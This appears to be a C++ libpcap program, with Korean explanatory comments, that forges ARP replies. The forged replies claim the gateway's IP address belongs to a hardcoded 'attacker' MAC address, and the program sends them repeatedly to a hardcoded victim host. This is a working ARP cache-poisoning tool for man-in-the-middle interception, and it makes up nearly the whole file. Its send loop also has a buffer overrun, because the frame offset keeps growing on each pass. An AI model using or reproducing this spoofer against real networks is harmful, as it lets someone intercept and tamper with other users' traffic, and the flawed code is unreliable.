#include <stdio.h>
#include <iostream>
#include <signal.h>
#include <stdlib.h>
#include <pcap.h>
#include <sys/socket.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <string.h>
using namespace std;
    // pcap_t *pcap_open_live(char *device, int snaplen, int promisc, int to_ms, char *ebuf)
    // 현재 네트워크에서 사용하는 네트워크 디바이스의 패킷을 캡처하는 함수
    // 1번째는 오픈한 네트워크 어뎁터에 대한 장치드라이버에 대한 이름
    // 두번째 snaplen은 캡처할 패킷의 크기이다
    // 세번째가캡처 모드인데 보통 1(모든 패킷을 캡처)을 준다
    // ebuf는 캡처에 실패했을때 에러메시지를 저장해주는 버퍼이다

    // pcap_next_ex
    // 마지막으로 캡처한 패킷 데이터를 실제 가져오는 함수이다
    // 다음 패킷에 대한 포인터를 리턴한다
    // 프로그래머가 원할때 패킷을 직접적으로 받을 수 있다
    // 이 패킷을 읽음으로써 패킷의 정보를 얻어올 수 있다
    // pcap_next_ex (pcap_t * p, struct pcap_pkthdr ** pkt_header, const u_char ** pkt_data);
    // 패킷을 문제없이 읽은 경우, pkt_header 인수가 가리키는 포인터는
    // 패킷의 pcap_pkthdr 구조체를 가리 키도록 설정되고
    // pkt_data 인수가 가리키는 포인터는 패킷의 데이터를 가리 키도록 설정

struct arp_hdr {
    uint16_t hardware_type; // 2
    uint16_t protocol_type;
    uint8_t hardwar_size; // 1
    uint8_t protocol_size;
    uint16_t opcode;
    uint8_t sender_mac_address[6]; // 6
    uint8_t sender_ip_address[4];
    uint8_t target_mac_address[6];
    uint8_t target_ip_address[4];
}; //28

struct ether_header1{
    uint8_t  ether_dhost[6];   /* destination eth addr   */
    uint8_t  ether_shost[6];   /* source ether addr   */
    uint16_t ether_type;    /* packet type ID field   */
};


int main(int argc, char **argv)
{
    char *dev;    // 네트워크 디바이스
    char *net;    // 네트워크 어드레스
    char *mask;   // 네트워크 mask 어드레스
    int ret;      //
    char errbuf[PCAP_ERRBUF_SIZE]; // 에러 발생 시 에러 메시지 저장하는 버퍼
    bpf_u_int32 netp;  // 네트워크 디바이스의 네트워크 주소가 저장될 주소
    bpf_u_int32 maskp; // 네트워크 디바이스의 넷마스크 주소가 저장될 주소
    struct in_addr addr;
    struct pcap_pkthdr *pkt_hdr;
    const u_char *pkt_data;
    pcap_t *pcd;
    int res;
    u_int8_t j[42];
    struct arp_hdr a;
    struct ether_header1 b;

    a.hardware_type = htons(1); //3
    a.protocol_type = htons(0x0800);
    a.hardwar_size = 0x06;
    a.protocol_size = 0x04;
    a.opcode = htons(0x0002);
    a.sender_mac_address[0] = 0x00; // 2 attacker mac
    a.sender_mac_address[1] = 0x0c;
    a.sender_mac_address[2] = 0x29;
    a.sender_mac_address[3] = 0x12;
    a.sender_mac_address[4] = 0x6a;
    a.sender_mac_address[5] = 0xcc;
    a.sender_ip_address[0] = 0xc0; // gateway ip
    a.sender_ip_address[1] = 0xa8;
    a.sender_ip_address[2] = 0xb3;
    a.sender_ip_address[3] = 0x02;
    a.target_mac_address[0] = 0x00; // 1 client mac
    a.target_mac_address[1] = 0x0c;
    a.target_mac_address[2] = 0x29;
    a.target_mac_address[3] = 0xAE;
    a.target_mac_address[4] = 0x73;
    a.target_mac_address[5] = 0xF4;
    a.target_ip_address[0] = 0xc0; // client ip
    a.target_ip_address[1] = 0xa8;
    a.target_ip_address[2] = 0xb3;
    a.target_ip_address[3] = 0x80;

    b.ether_dhost[0] = 0x00;
    b.ether_dhost[1] = 0x0c;
    b.ether_dhost[2] = 0x29;
    b.ether_dhost[3] = 0xae;
    b.ether_dhost[4] = 0x73;
    b.ether_dhost[5] = 0xf4;

    b.ether_shost[0] = 0x00;
    b.ether_shost[1] = 0x0c;
    b.ether_shost[2] = 0x29;
    b.ether_shost[3] = 0x12;
    b.ether_shost[4] = 0x6a;
    b.ether_shost[5] = 0xcc;

    b.ether_type = htons(0x0806);

    dev = argv[2];

    if(dev == NULL)
    {
        printf("%s\n", errbuf);
        exit(0);
    }

    // 네트워크 디바이스 이름 출력
    printf("DEV: %s\n", dev);

    //네트워크 디바이스의 네트워크 주소와 netmask 정보를 가져오기 위해 사용
    // mask, ip 정보 얻어오기
    ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);

    if(ret == -1) // 에러 발생시
    {
        printf("%s\n",errbuf);
        exit(0);
    }


    // 네트웍 어드레스를 점박이 3형제 스타일로 ??
    addr.s_addr = netp;
    net = inet_ntoa(addr);

    if(net == NULL)
    {
        perror("inet_ntoa");
        exit(0);
    }

    printf("NET: %s\n",net);


    // 마찬가지로 mask 어드레스를 점박이 3형제 스타일로
    addr.s_addr = maskp;
    mask = inet_ntoa(addr);

    if(mask == NULL)
    {
        perror("inet_ntoa");
        exit(0);
    }
    printf("MASK: %s\n",mask);
    printf("=======================\n");


    pcd = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcd == NULL)
    {
        printf("%s\n", errbuf);
        exit(0);
    }

    struct ether_header *ep;
    struct ip *iph;
    struct tcphdr *tcph;
    int length=0;

    while((res = pcap_next_ex(pcd, &pkt_hdr, &pkt_data))>=0)
    {
        memcpy(j, (u_int8_t*)&b, 14);
        length = length + 14;
        memcpy(j+length, (u_int8_t*)&a, 28);

        for(int x = 0; x < 42; x++)
        {
            if(x%16==0)
            {
                printf("\n");
            }
            printf("%02x ", j[x]);

        }
        printf("\n");
        pcap_sendpacket(pcd, (const u_char*)j, sizeof(j));

    }
    // -1 == 에러가 발생했을 때
    if (res == -1)
    {
       printf("Error : %s\n",errbuf);
       exit(0);
    }
}

